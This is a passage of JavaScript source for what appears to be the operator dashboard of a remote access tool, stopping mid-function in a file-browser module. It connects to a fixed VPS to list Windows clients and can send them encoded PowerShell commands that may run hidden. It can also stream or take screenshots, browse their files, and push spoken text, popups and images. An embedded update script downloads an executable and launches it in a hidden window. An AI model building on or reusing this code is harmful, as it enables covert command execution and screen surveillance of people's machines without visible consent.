const RunApp = (() => {
    const VPS_URL = 'http://runx.ddns.net';

    // ── Application State ──
    const runState = {
        rows: [],
        sortedRows: [],
        password: sessionStorage.getItem('vps_password') || '',
        popupMode: null,
        popupUser: null,
        selectedVoice: 'David',
        selectedVis: true,
        activeUsername: null,
        interactionMode: null,
        lastRenderSignature: null,
        fetchInFlight: false,
        isConnected: false,
        hintUsername: null,
        isRendering: false,
        popupExampleText: '',
        cmdLoadedFromUpload: false,
        selectedSpkVolume: 100,
        selectedSpkSpeed: 0,
        themeSelection: localStorage.getItem('run_theme') || 'night',
        theme: 'night'
    };

    const popupExamples = {
        speak: ['Audio test, all systems ready.', 'Status update: task completed.', 'Heads up, check your dashboard.'],
        popup_msg: ['Reminder: save your work now.', 'Notice: update available.', 'Quick check: please confirm.']
    };

    const demoUsers = [
        { username: 'a-00000000-W', updated_at: new Date(Date.now() - 4000).toISOString(), visible: true, demo: true },
        { username: 'b-00000000-W', updated_at: new Date(Date.now() - 17000).toISOString(), visible: false, demo: true },
        { username: 'c-00000000-W', updated_at: new Date(Date.now() - 75000).toISOString(), visible: false, demo: true },
        { username: 'd-00000000-L', updated_at: new Date(Date.now() - 90000).toISOString(), visible: true, demo: true }
    ];

    const $ = id => document.getElementById(id);
    const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];
    const STATUS_ORDER = { green: 0, yellow: 1, red: 2 };

    const WIN_LOGO_HTML = `<i class="bi bi-windows os-logo" aria-hidden="true"></i>`;

    const ACTION_MODE_LABELS = {
        cmd: 'Commandline',
        speak: 'Speak',
        popup_msg: 'Message',
        imager: 'Imager',
        scripts: 'Scripts',
        placeholder: 'Scripts'
    };

    let dashboardSocket = null;
    let isSendingCommand = false;

    // ── Platform & Username Parsing Helpers ──
    function parseModernUsername(username) {
        if (window.RunUtils?.parseUsername) {
            return window.RunUtils.parseUsername(username);
        }
        const text = String(username || '').trim();
        const match = text.match(/^(.*?)-([^-]+)-(W|WIN)$/i);
        if (!match) return { baseName: text, id: '', os: 'W' };
        return { baseName: match[1], id: match[2], os: match[3].toUpperCase() };
    }


    function getDisplayUsername(username) {
        return runState.displayNameMap?.get(username) || parseModernUsername(username).baseName;
    }

    function buildDisplayUsernameMap(rows) {
        const counts = new Map();
        rows.forEach(user => {
            const { baseName } = parseModernUsername(user.username);
            counts.set(baseName, (counts.get(baseName) || 0) + 1);
        });
        return new Map(rows.map(user => {
            const parsed = parseModernUsername(user.username);
            const needsId = parsed.id && (counts.get(parsed.baseName) || 0) > 1;
            return [user.username, needsId ? `${parsed.baseName} (${parsed.id})` : parsed.baseName];
        }));
    }

    function parseServerTime(value) {
        if (!value) return NaN;
        const text = String(value).trim();
        if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(text)) {
            return new Date(text.replace(' ', 'T') + 'Z');
        }
        return new Date(text);
    }

    function getStatus(user, nowMs = Date.now()) {
        if (user.demo && user.username === 'a-00000000-W') return 'green';
        if (user.demo) {
            const diff = (nowMs - parseServerTime(user.updated_at).getTime()) / 1000;
            return diff < 10 ? 'green' : diff < 30 ? 'yellow' : 'red';
        }
        if (typeof user.online === 'boolean') {
            return user.online ? 'green' : 'red';
        }
        const diff = (nowMs - parseServerTime(user.updated_at).getTime()) / 1000;
        return diff < 10 ? 'green' : diff < 30 ? 'yellow' : 'red';
    }

    function sortRows(rows) {
        return [...rows].sort((a, b) =>
            STATUS_ORDER[getStatus(a)] - STATUS_ORDER[getStatus(b)] || a.username.localeCompare(b.username)
        );
    }

    function getRenderableRows() {
        return runState.isConnected ? runState.sortedRows : sortRows(demoUsers);
    }

    function getHintUsername(sorted = getRenderableRows()) {
        if (!sorted.length) return null;
        if (runState.activeUsername && sorted.some(u => u.username === runState.activeUsername)) {
            return runState.activeUsername;
        }
        return null;
    }

    function buildRowsRenderSignature(rows, isSorted = false) {
        const nowMs = Date.now();
        const source = isSorted ? rows : sortRows(rows);
        return source
            .map(u => {
                const st = getStatus(u, nowMs);
                return { username: u.username, status: st, visible: !!u.visible, updatedAt: st === 'green' ? '' : u.updated_at };
            })
            .sort((a, b) => STATUS_ORDER[a.status] - STATUS_ORDER[b.status] || a.username.localeCompare(b.username))
            .map(u => `${u.username}|${u.status}|${u.visible ? 1 : 0}|${u.updatedAt}`)
            .join('||');
    }

    // ── Theme Management ──
    const cap = s => s.charAt(0).toUpperCase() + s.slice(1);
    function pickRandomTheme() {
        return themeNames[Math.floor(Math.random() * themeNames.length)];
    }

    function updateRandomThemeOptionLabel(activeTheme) {
        const label = `Random (${cap(activeTheme)})`;
        ['run-theme-random-option', 'sidebar-theme-random-option'].forEach(id => {
            const el = $(id);
            if (el) el.textContent = label;
        });
    }

    function applyTheme(themeName = 'night') {
        const usingRandom = themeName === 'random';
        const next = usingRandom ? pickRandomTheme() : (themeNames.includes(themeName) ? themeName : 'night');
        runState.themeSelection = usingRandom ? 'random' : next;
        runState.theme = next;
        document.documentElement.dataset.theme = next;
        localStorage.setItem('run_theme', runState.themeSelection);
        updateRandomThemeOptionLabel(next);

        const lbl = $('run-theme-label');
        if (lbl) lbl.textContent = usingRandom ? `random (${next})` : next;

        window.RunUtils?.sizeDropdownToContent(
            $('run-theme-btn'), $('runThemeMenu'), $('runThemeWrap'),
            Array.from($('runThemeMenu')?.querySelectorAll('.file-dropdown-item') || []).map(i => i.textContent.trim()),
            'file-btn'
        );

        document.querySelectorAll('#runThemeMenu .file-dropdown-item, .sidebar-theme-btn').forEach(el => {
            el.classList.toggle('active', el.dataset.themeVal === runState.themeSelection);
        });
    }

    // ── Connection Handling ──
    function storePassword(password) {
        runState.password = password || '';
        if (runState.password) {
            sessionStorage.setItem('vps_password', runState.password);
        } else {
            sessionStorage.removeItem('vps_password');
        }
    }

    function setConnectionState(connected) {
        runState.isConnected = !!connected;
        const label = connected ? 'disconnect' : 'connect';
        ['run-connect-btn', 'sidebar-connect-btn'].forEach(id => {
            const el = $(id);
            if (!el) return;
            el.textContent = label;
            el.classList.toggle('connected', !!connected);
        });
    }

    function disconnectAndReset() {
        storePassword('');
        setConnectionState(false);
        runState.rows = [];
        runState.sortedRows = [];
        runState.lastRenderSignature = null;
        renderGrid();
        if (typeof FramesApp?.resetFramesState === 'function') {
            FramesApp.resetFramesState();
        }
    }

    async function validateVpsConnection(password) {
        if (!password) return false;
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 7000);
        try {
            const res = await fetch(`${VPS_URL}/api/clients`, {
                signal: controller.signal,
                headers: { 'x-password': password }
            });
            return res.ok;
        } catch {
            return false;
        } finally {
            clearTimeout(timeoutId);
        }
    }

    async function connectWithCredentials({ notifyOnFail = true } = {}) {
        const isValid = await validateVpsConnection(runState.password);
        if (!isValid) {
            storePassword('');
            setConnectionState(false);
            if (notifyOnFail) alert('Connection failed. Please reconnect.');
            return false;
        }
        storePassword(runState.password);
        setConnectionState(true);
        fetchData();
        return true;
    }

    function promptAllCredentials() {
        const passwordInput = prompt('Dashboard password:');
        if (passwordInput === null || !passwordInput) return false;
        runState.password = passwordInput;
        return true;
    }

    async function promptAndConnect() {
        if (!promptAllCredentials()) return;
        await connectWithCredentials({ notifyOnFail: true });
    }

    // ── WebSocket Dashboard Integration ──
    function initDashboardSocket() {
        if (typeof io === 'undefined') return;
        if (!dashboardSocket) {
            try {
                dashboardSocket = io(VPS_URL);
                dashboardSocket.on('connect', () => {
                    if (runState.password) {
                        dashboardSocket.emit('register_dashboard', { password: runState.password });
                    }
                });
                dashboardSocket.on('status_change', data => {
                    if (!data || !data.username || !runState.isConnected) return;
                    const row = runState.rows.find(r => r.username === data.username);
                    if (row) {
                        row.online = !!data.online;
                        if (data.version !== undefined) row.version = data.version;
                        runState.sortedRows = sortRows(runState.rows);
                        renderGrid();
                    } else {
                        fetchData();
                    }
                });
                dashboardSocket.on('new_frame', data => {
                    if (typeof FramesApp !== 'undefined' && FramesApp.handleNewFrame) {
                        FramesApp.handleNewFrame(data);
                    }
                });
                dashboardSocket.on('new_operation_log', data => {
                    handleRealtimeLog(data);
                });
            } catch {}
        } else if (dashboardSocket.connected && runState.password) {
            dashboardSocket.emit('register_dashboard', { password: runState.password });
        }
    }

    // ── Rendering Grid & Cards ──
    function refreshHintsIfNeeded() {
        if (runState.isRendering) return;
        const next = getHintUsername();
        if (next !== runState.hintUsername) {
            runState.hintUsername = next;
            renderGrid();
        }
    }

    function getCardBodyHtml(user, status, alive, tsText, showHint) {
        const canInteract = runState.isConnected || !!user.demo;
        const showPrimary = showHint && alive && canInteract;
        const disabledAttrs = 'disabled aria-disabled="true"';
        const displayUsername = getDisplayUsername(user.username);
        const versionAttr = user.version ? ` title="${user.version}"` : '';

        return `
            <div class="card-header">
                <div style="flex:1;min-width:0;">
                    <span class="card-username ${alive ? '' : 'offline'}"${versionAttr}>${displayUsername}</span>
                    <div class="card-ts">${tsText}</div>
                </div>
                ${WIN_LOGO_HTML}
            </div>
            <div class="card-actions">
                <button class="card-btn primary ${alive && canInteract ? '' : 'disabled'}" data-action="ps" ${alive && canInteract ? '' : disabledAttrs}>
                    CMD ${showPrimary ? '<span class="btn-hint">C</span>' : ''}
                </button>
                <button class="card-btn ${canInteract ? '' : 'disabled'}" data-action="output" ${canInteract ? '' : disabledAttrs}>
                    OUT ${showHint && canInteract ? '<span class="btn-hint">V</span>' : ''}
                </button>
            </div>`;
    }

    function getCardRenderSignature(user, status, alive, tsText, showHint) {
        return `${user.username}|${getDisplayUsername(user.username)}|${user.version || ''}|${status}|${alive ? 1 : 0}|${showHint ? 1 : 0}|${tsText}`;
    }

    function renderGrid() {
        runState.isRendering = true;
        const grid = $('user-grid');
        if (!grid) {
            runState.isRendering = false;
            return;
        }

        const sorted = getRenderableRows();
        runState.displayNameMap = buildDisplayUsernameMap(sorted);
        runState.hintUsername = getHintUsername(sorted);

        if (!sorted.length) {
            if (!grid.querySelector('.empty')) {
                grid.innerHTML = '<div class="empty">NO CLIENTS CONNECTED</div>';
            }
            runState.hintUsername = null;
            clearActiveSelection();
            runState.isRendering = false;
            return;
        }

        const existingCards = new Map();
        grid.querySelectorAll('.user-card').forEach(card => existingCards.set(card.dataset.username, card));
        const animateAll = existingCards.size === 0;
        const seen = new Set();

        sorted.forEach((user, index) => {
            const status = getStatus(user);
            const alive = status === 'green';
            const lastSeen = parseServerTime(user.updated_at);
            const tsText = alive ? '' : `Last seen: ${lastSeen.toLocaleDateString()} ${lastSeen.toLocaleTimeString()}`;
            const showHint = user.username === runState.hintUsername;
            const sig = getCardRenderSignature(user, status, alive, tsText, showHint);

            let card = existingCards.get(user.username);
            const isNew = !card;
            if (!card) {
                card = document.createElement('div');
                card.dataset.username = user.username;
                existingCards.set(user.username, card);
            }

            const cn = `user-card${alive ? '' : ' offline'} windows-user`;
            if (card.className !== cn) card.className = cn;
            if (card.dataset.renderSignature !== sig) {
                card.innerHTML = getCardBodyHtml(user, status, alive, tsText, showHint);
                card.dataset.renderSignature = sig;
            }
            seen.add(user.username);

            const ref = grid.children[index] || null;
            if (ref !== card) grid.insertBefore(card, ref);

            if (isNew || animateAll) {
                card.classList.remove('card-enter');
                card.style.animationDelay = `${Math.min(index, 8) * 35}ms`;
                void card.offsetWidth;
                card.classList.add('card-enter');
            }
        });

        grid.querySelectorAll('.user-card').forEach(c => {
            if (!seen.has(c.dataset.username)) c.remove();
        });
        grid.querySelector('.empty')?.remove();

        if (runState.activeUsername) {
            const active = sorted.find(u => u.username === runState.activeUsername);
            if (active) setActiveSelection(active, runState.interactionMode || 'hover');
            else clearActiveSelection();
        }
        if ($('actionTargetMenu')?.classList.contains('open')) renderTargetDropdown();
        runState.isRendering = false;
    }

    // ── Selection & Keyboard Navigation ──
    function setRunClientName(username) {
        const el = $('runClientName');
        const wrap = $('runClientWrap');
        if (!el || !wrap) return;
        if (username) {
            el.textContent = getDisplayUsername(username);
            wrap.style.display = 'flex';
        } else {
            el.textContent = '';
            wrap.style.display = 'none';
        }
    }

    function clearActiveSelection() {
        runState.activeUsername = null;
        runState.interactionMode = null;
        document.body.classList.remove('kb-mode');
        document.querySelectorAll('.user-card').forEach(c => c.classList.remove('selected'));
        setRunClientName(null);
        refreshHintsIfNeeded();
    }

    function setActiveSelection(user, mode, { scroll = false } = {}) {
        if (!user) {
            clearActiveSelection();
            return;
        }
        runState.activeUsername = user.username;
        runState.interactionMode = mode;
        document.body.classList.toggle('kb-mode', mode === 'keyboard');
        const sorted = getRenderableRows();
        const idx = sorted.findIndex(u => u.username === user.username);
        const cards = document.querySelectorAll('.user-card');
        cards.forEach(c => c.classList.remove('selected'));
        if (idx !== -1 && idx < cards.length) {
            cards[idx].classList.add('selected');
            if (scroll) cards[idx].scrollIntoView({ block: 'nearest' });
        }
        refreshHintsIfNeeded();
    }

    // ── Popup Modal Helpers ──
    function pickRandomPopupExample(mode) {
        const list = popupExamples[mode];
        return list?.length ? list[Math.floor(Math.random() * list.length)] : '';
    }

    function updatePlaceholder() {
        const ta = $('popup-input');
        const m = runState.popupMode;
        if (!ta) return;
        if (m === 'cmd') ta.placeholder = "Get-Process | Where-Object { $_.CPU -gt 100 }";
        else if (m === 'speak') ta.placeholder = `Type speech text i.e. "${runState.popupExampleText || 'Audio test, all systems ready.'}"`;
        else if (m === 'popup_msg') ta.placeholder = `Type popup note i.e. "${runState.popupExampleText || 'Reminder: save your work now.'}"`;
    }

    function getPopupAutofillText() {
        const m = runState.popupMode;
        if (m === 'cmd') return $('popup-input')?.placeholder || '';
        return runState.popupExampleText || pickRandomPopupExample(m) || $('popup-input')?.placeholder || '';
    }

    function updateOptionsUI() {
        const setActive = (id, cond) => {
            const el = $(id);
            if (el) el.className = 'opt-btn' + (cond ? ' active' : '');
        };
        setActive('voice-david', runState.selectedVoice === 'David');
        setActive('voice-zira', runState.selectedVoice === 'Zira');
        setActive('vis-true', runState.selectedVis);
        setActive('vis-false', !runState.selectedVis);

        const setPill = (id, cond) => {
            const el = $(id);
            if (el) el.className = 'collapsible-meta-pill' + (cond ? ' active' : '');
        };
        setPill('shell-summary-ps', true);
        setPill('shell-summary-upload', runState.cmdLoadedFromUpload);

        const screenshotBtn = $('enable-screenshot-btn');
        const screenshotPill = $('screenshot-status-pill');
        const singleBtn = $('single-screenshot-btn');
        const isCapturing = !!runState.popupUser?.capture;
        if (screenshotBtn) {
            screenshotBtn.classList.toggle('active', isCapturing);
            if (screenshotPill) screenshotPill.textContent = isCapturing ? 'ON' : 'OFF';
        }
        if (singleBtn) {
            singleBtn.classList.toggle('disabled', isCapturing);
            if (isCapturing) {
                singleBtn.setAttribute('title', 'Screenshot Stream is active. Single capture disabled while streaming.');
            } else {
                singleBtn.removeAttribute('title');
            }
        }

        const vol = $('spk-volume');
        const spd = $('spk-speed');
        if (vol) vol.value = String(runState.selectedSpkVolume);
        if (spd) spd.value = String(runState.selectedSpkSpeed);

        const volV = $('spk-volume-value');
        const spdV = $('spk-speed-value');
        const meta = $('spk-summary-meta');
        if (volV) volV.textContent = String(runState.selectedSpkVolume);
        if (spdV) spdV.textContent = String(runState.selectedSpkSpeed);
        if (meta) meta.textContent = `Volume ${runState.selectedSpkVolume} | Speed ${runState.selectedSpkSpeed}`;

        updatePlaceholder();
    }

    // ── Popup Open / Close ──
    function closeActionModeDropdown() {
        $('action-mode-btn')?.classList.remove('open');
        $('actionModeMenu')?.classList.remove('open');
    }

    function sizeActionModeDropdown() {
        window.RunUtils?.sizeDropdownToContent(
            $('action-mode-btn'), $('actionModeMenu'), $('actionModeWrap'),
            Array.from($('actionModeMenu')?.querySelectorAll('.file-dropdown-item') || []).map(i => i.textContent.trim()),
            'file-btn'
        );
    }

    function applyActionMode(mode) {
        runState.popupMode = mode;
        runState.popupExampleText = (mode === 'speak' || mode === 'popup_msg') ? pickRandomPopupExample(mode) : '';
        runState.cmdLoadedFromUpload = false;

        const input = $('popup-input');
        if (input) input.value = '';
        $('textarea-wrap')?.classList.remove('show-hint');

        const isCmd = mode === 'cmd';
        const isSpk = mode === 'speak';
        const isScripts = mode === 'scripts' || mode === 'placeholder';
        const isImager = mode === 'imager';

        if ($('textarea-wrap')) $('textarea-wrap').style.display = (isScripts || isImager) ? 'none' : 'flex';
        if ($('placeholder-body')) $('placeholder-body').style.display = isScripts ? 'flex' : 'none';
        if ($('imager-section')) $('imager-section').style.display = isImager ? 'flex' : 'none';
        if ($('vis-section')) $('vis-section').style.display = isCmd ? 'flex' : 'none';
        if ($('shell-section')) $('shell-section').style.display = isCmd ? 'block' : 'none';
        if ($('voice-section')) $('voice-section').style.display = isSpk ? 'flex' : 'none';
        if ($('spk-controls')) $('spk-controls').style.display = isSpk ? 'block' : 'none';

        if ($('shell-section')) $('shell-section').open = false;
        if ($('spk-controls')) $('spk-controls').open = false;
        if ($('popup-confirm')) $('popup-confirm').style.display = isScripts ? 'none' : '';

        const label = $('action-mode-label');
        if (label) label.textContent = ACTION_MODE_LABELS[mode] || mode;

        document.querySelectorAll('#actionModeMenu .file-dropdown-item').forEach(item => {
            item.classList.toggle('active', item.dataset.mode === mode);
        });
        document.querySelectorAll('#sidebar-mode-list .sidebar-theme-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.mode === mode);
        });

        closeActionModeDropdown();
        updateOptionsUI();
        if (isImager) {
            setTimeout(() => {
                $('imager-caption-input')?.focus();
            }, 50);
        } else if (!isScripts) {
            setTimeout(() => {
                $('popup-input')?.focus();
                syncTabHint();
            }, 50);
        }
    }

    function closeTargetDropdown() {
        $('popup-target-label')?.classList.remove('open');
        $('actionTargetMenu')?.classList.remove('open');
    }

    function renderTargetDropdown() {
        const menu = $('actionTargetMenu');
        if (!menu) return;
        menu.innerHTML = '';
        const current = runState.popupUser;
        const allRows = getRenderableRows();

        window.RunUtils?.sizeDropdownToContent(
            $('popup-target-label'), menu, $('actionTargetWrap'),
            allRows.map(u => u.username), 'folder-btn run-client-name'
        );

        const others = allRows.filter(u => u.username !== current?.username);
        if (!others.length) {
            closeTargetDropdown();
            return;
        }

        others.forEach(u => {
            const item = document.createElement('div');
            item.className = 'dropdown-item';
            item.textContent = u.username;
            item.addEventListener('click', () => {
                closeTargetDropdown();
                openPopup(runState.popupMode || 'cmd', u);
            });
            menu.appendChild(item);
        });
    }

    function openPopup(mode, user) {
        runState.popupUser = user;
        runState.selectedVis = !!user.visible;
        if ($('popup-target-label')) $('popup-target-label').textContent = user.username;
        const sidebarTarget = $('sidebar-action-target');
        if (sidebarTarget) sidebarTarget.textContent = user.username;

        document.body.classList.remove('view-run', 'view-frames');
        document.body.classList.add('view-action');
        closeTargetDropdown();
        renderTargetDropdown();
        sizeActionModeDropdown();
        applyActionMode(mode);
    }

    function closePopup() {
        resetImager();
        $('textarea-wrap')?.classList.remove('show-hint');
        closeTargetDropdown();
        closeActionModeDropdown();
        runState.popupMode = null;
        runState.popupUser = null;
        runState.popupExampleText = '';
        document.body.classList.remove('view-action');
        document.body.classList.add('view-run');
    }

    // ── Imager Mode State & File Handling ──
    const imagerState = {
        file: null,
        imageData: null,
        fileName: '',
        fileSizeText: '',
        dimensionsText: ''
    };

    function resetImager() {
        imagerState.file = null;
        imagerState.imageData = null;
        imagerState.fileName = '';
        imagerState.fileSizeText = '';
        imagerState.dimensionsText = '';

        const dropzone = $('imager-dropzone');
        const emptyView = $('imager-empty-view');
        const previewWrap = $('imager-preview-wrap');
        const previewImg = $('imager-preview-img');
        const fileInput = $('imager-file-input');
        const metaSpan = $('imager-file-meta');
        const captionInput = $('imager-caption-input');

        if (fileInput) fileInput.value = '';
        if (previewImg) previewImg.src = '';
        if (metaSpan) {
            metaSpan.textContent = '';
            metaSpan.title = '';
        }
        if (captionInput) captionInput.value = '';
        if (previewWrap) previewWrap.style.display = 'none';
        if (emptyView) emptyView.style.display = 'flex';
        if (dropzone) dropzone.classList.remove('dragover');
    }

    function formatBytes(bytes) {
        if (!bytes || bytes <= 0) return '0 B';
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    }

    function processImagerFile(file) {
        if (!file || (!file.type.startsWith('image/') && !file.name.match(/\.(png|jpe?g|gif|webp|bmp)$/i))) {
            alert('Please select a valid image file (PNG, JPG, WebP, GIF, etc.).');
            return;
        }

        const isGif = file.type === 'image/gif' || file.name.toLowerCase().endsWith('.gif');

        const reader = new FileReader();
        reader.onload = e => {
            const rawDataUrl = e.target.result;

            if (isGif) {
                // Keep animated GIF frames intact without canvas flattening
                const tempImg = new Image();
                tempImg.onload = () => {
                    const w = tempImg.naturalWidth || tempImg.width;
                    const h = tempImg.naturalHeight || tempImg.height;
                    const b64 = rawDataUrl.split(',')[1];

                    imagerState.file = file;
                    imagerState.imageData = b64;
                    imagerState.fileName = file.name || 'animation.gif';
                    imagerState.fileSizeText = formatBytes(file.size || Math.round(b64.length * 0.75));
                    imagerState.dimensionsText = `${w}×${h} (GIF)`;

                    const previewImg = $('imager-preview-img');
                    const metaSpan = $('imager-file-meta');
                    const emptyView = $('imager-empty-view');
                    const previewWrap = $('imager-preview-wrap');

                    if (previewImg) previewImg.src = rawDataUrl;
                    if (metaSpan) {
                        metaSpan.textContent = imagerState.fileName;
                        metaSpan.title = `${imagerState.fileName} (${imagerState.dimensionsText}, ${imagerState.fileSizeText})`;
                    }
                    if (emptyView) emptyView.style.display = 'none';
                    if (previewWrap) previewWrap.style.display = 'flex';
                };
                tempImg.src = rawDataUrl;
                return;
            }

            const tempImg = new Image();
            tempImg.onload = () => {
                const maxDim = 1280;
                let w = tempImg.naturalWidth || tempImg.width;
                let h = tempImg.naturalHeight || tempImg.height;

                let targetW = w;
                let targetH = h;
                if (w > maxDim || h > maxDim) {
                    if (w > h) {
                        targetW = maxDim;
                        targetH = Math.round((h * maxDim) / w);
                    } else {
                        targetH = maxDim;
                        targetW = Math.round((w * maxDim) / h);
                    }
                }

                let dataUrl;
                if (file.size < 400 * 1024 && w <= maxDim && h <= maxDim) {
                    dataUrl = rawDataUrl;
                } else {
                    const canvas = document.createElement('canvas');
                    canvas.width = targetW;
                    canvas.height = targetH;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(tempImg, 0, 0, targetW, targetH);
                    dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                }

                const b64 = dataUrl.split(',')[1];

                imagerState.file = file;
                imagerState.imageData = b64;
                imagerState.fileName = file.name || 'image.jpg';
                imagerState.fileSizeText = formatBytes(Math.round(b64.length * 0.75));
                imagerState.dimensionsText = `${targetW}×${targetH}`;

                const previewImg = $('imager-preview-img');
                const metaSpan = $('imager-file-meta');
                const emptyView = $('imager-empty-view');
                const previewWrap = $('imager-preview-wrap');

                if (previewImg) previewImg.src = dataUrl;
                if (metaSpan) {
                    metaSpan.textContent = imagerState.fileName;
                    metaSpan.title = `${imagerState.fileName} (${imagerState.dimensionsText}, ${imagerState.fileSizeText})`;
                }
                if (emptyView) emptyView.style.display = 'none';
                if (previewWrap) previewWrap.style.display = 'flex';
            };
            tempImg.src = rawDataUrl;
        };
        reader.readAsDataURL(file);
    }

    // ── Command Building & Scripts ──
    function formatPSString(str) {
        return str.replace(/'/g, "''").split(/\r?\n/).map(line => `'${line}'`).join(' + [char]13 + ');
    }

    const UPDATE_CLIENT_SCRIPT_WIN = `$ProgressPreference = 'SilentlyContinue'
$p = "$env:APPDATA\\run"
if (!(Test-Path $p)) { 
    New-Item -ItemType Directory -Path $p -Force 
}

$sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits/main').sha
$o = "$p\\installer.exe"

Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
Start-Process -FilePath $o -WindowStyle Hidden`;

    async function doSendUpdateClient() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        const btn = $('update-client-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        isSendingCommand = true;
        const updateScript = UPDATE_CLIENT_SCRIPT_WIN;
        const encodedCmd = window.RunUtils ? window.RunUtils.encodeBase64(updateScript) : btoa(unescape(encodeURIComponent(updateScript)));
        const body = {
            username: user.username,
            cmd: encodedCmd,
            visible: runState.selectedVis ? 1 : 0
        };

        try {
            const res = await fetch(`${VPS_URL}/api/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify(body)
            });
            if (!res.ok) throw new Error('Failed to send command');
            fetchData();
        } catch {
            alert('Failed to send update command.');
        } finally {
            isSendingCommand = false;
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    async function doToggleEnableScreenshot() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        const nextCapture = !user.capture;
        const btn = $('enable-screenshot-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        try {
            const res = await fetch(`${VPS_URL}/api/capture`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: user.username, capture: nextCapture })
            });
            if (!res.ok) throw new Error('Failed to set capture');
            user.capture = nextCapture;
            const targetInRows = runState.rows.find(r => r.username === user.username);
            if (targetInRows) targetInRows.capture = nextCapture;
            updateOptionsUI();
            fetchData();
        } catch {
            alert('Failed to toggle screenshot stream.');
        } finally {
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    async function doDeleteAllScreenshots() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;
        if (!runState.isConnected || user.demo) {
            alert('Demo mode: action preview only. Connect to send real commands.');
            return;
        }

        if (!confirm(`Are you sure you want to delete all screenshot frames for ${user.username}?`)) return;

        const btn = $('delete-screenshots-btn');
        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.6';
        }

        try {
            const res = await fetch(`${VPS_URL}/api/frames/delete`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: user.username })
            });
            if (!res.ok) throw new Error('Failed to delete frames');
            if (typeof FramesApp !== 'undefined' && FramesApp.state?.currentFolder === user.username) {
                if (typeof FramesApp.resetFramesState === 'function') FramesApp.resetFramesState();
            }
            alert(`Successfully deleted all screenshot frames for ${user.username}.`);
        } catch {
            alert('Failed to delete screenshots.');
        } finally {
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // SCREENSHOT CAPTURE (SINGLE-CLICK TAKE & REDIRECT)
    // ═══════════════════════════════════════════════════════════════

    async function doTakeSingleScreenshot() {
        if (isSendingCommand) return;
        const user = runState.popupUser;
        if (!user) return;

        if (user.capture) {
            alert('Cannot capture screenshot while Screenshot Stream is active.');
            return;
        }

        const btn = $('single-screenshot-btn');
        const iconWrap = btn?.querySelector('.script-icon-wrap');
        const originalIcon = iconWrap ? iconWrap.innerHTML : '';

        if (btn) {
            btn.style.pointerEvents = 'none';
            btn.style.opacity = '0.7';
            if (iconWrap) {
                iconWrap.innerHTML = '<i class="bi bi-arrow-repeat" style="display:inline-block;animation:spin 0.8s linear infinite;"></i>';
            }
        }

        const restoreBtn = () => {
            if (btn) {
                btn.style.pointerEvents = '';
                btn.style.opacity = '';
                if (iconWrap && originalIcon) iconWrap.innerHTML = originalIcon;
            }
        };

        if (!runState.isConnected || user.demo) {
            // Demo mode simulation
            setTimeout(() => {
                restoreBtn();
                closePopup();
                if (typeof window.__switchMode === 'function') {
                    window.__switchMode('frames');
                } else {
                    $('brandToggle')?.click();
                }
                if (typeof FramesApp !== 'undefined') {
                    FramesApp.loadFolder(user.username);
                }
            }, 500);
            return;
        }

        try {
            const res = await fetch(`${VPS_URL}/api/screenshot/take`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
                body: JSON.stringify({ username: user.username })
            });

            if (!res.ok) {
                const errData = await res.json().catch(() => ({}));
                throw new Error(errData.message || 'Failed to capture screenshot');
            }

            const data = await res.json();
            restoreBtn();

            // Redirect user to the frames page for this user and focused on this frame!
            closePopup();
            if (typeof window.__switchMode === 'function') {
                window.__switchMode('frames');
            } else {
                $('brandToggle')?.click();
            }

            if (typeof FramesApp !== 'undefined') {
                FramesApp.loadFolder(data.username || user.username, data.filename);
            }
        } catch (err) {
            restoreBtn();
            alert(err.message || 'Failed to capture screenshot.');
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // FTP FILE BROWSER MODULE
    // ═══════════════════════════════════════════════════════════════

    const ftpState = {
        isOpen: false,
        user: null,
        currentPath: 'drives',
        parentPath: null,
        drives: [],
        items: [],
        filteredItems: [],
        selectedItem: null,
        isLoading: false,
        filterQuery: '',
        previewData: null
    };

    function formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        if (!bytes || isNaN(bytes)) return '—';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(i === 0 ? 0 : 1)) + ' ' + sizes[i];
    }

    function formatFileDate(timestamp) {
        if (!timestamp) return '—';
        try {
            const d = new Date(timestamp * 1000);
            const pad = n => String(n).padStart(2, '0');
